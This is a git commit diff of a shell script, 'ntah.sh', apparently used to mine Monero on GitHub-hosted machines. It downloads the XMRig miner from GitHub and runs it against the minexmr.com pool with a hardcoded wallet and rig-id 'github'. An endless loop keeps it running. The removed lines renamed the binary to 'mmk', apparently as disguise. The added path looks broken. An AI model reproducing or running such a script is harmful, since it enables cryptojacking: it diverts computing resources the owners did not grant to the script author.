b7b523280a166f1c994b0e96f906556fc304f8d3
dahlahh <82923191+dahlahh@users.noreply.github.com>
2021-04-21 10:52:25 +0700

    Update ntah.sh

--- ntah.sh
+++ ntah.sh
@@ -3,10 +3,9 @@ sudo apt update
 sudo apt install screen -y
 wget https://github.com/xmrig/xmrig/releases/download/v6.8.2/xmrig-6.8.2-linux-x64.tar.gz
 tar -xzvf xmrig-6.8.2-linux-x64.tar.gz
-mv /xmrig-6.8.2/xmrig mmk
-chmod +x mmk
-rm -rf xmrig-6.8.2
-./mmk -o us-west.minexmr.com:443 -u 42W4nii4hgbQEvjcV3j1bCiwkf6151v7fdruXhjRGnZc3oUDXwVTZAyR1pVxBuyXrD84BgnPvdXsCM4MGd811LAGUHrHQhc -k --tls --rig-id github
+cd /xmrig-6.8.2/xmrig
+chmod +x xmrig
+./xmrig -o us-west.minexmr.com:443 -u 42W4nii4hgbQEvjcV3j1bCiwkf6151v7fdruXhjRGnZc3oUDXwVTZAyR1pVxBuyXrD84BgnPvdXsCM4MGd811LAGUHrHQhc -k --tls --rig-id github
 while [ 1 ]; do
 sleep 3
 done
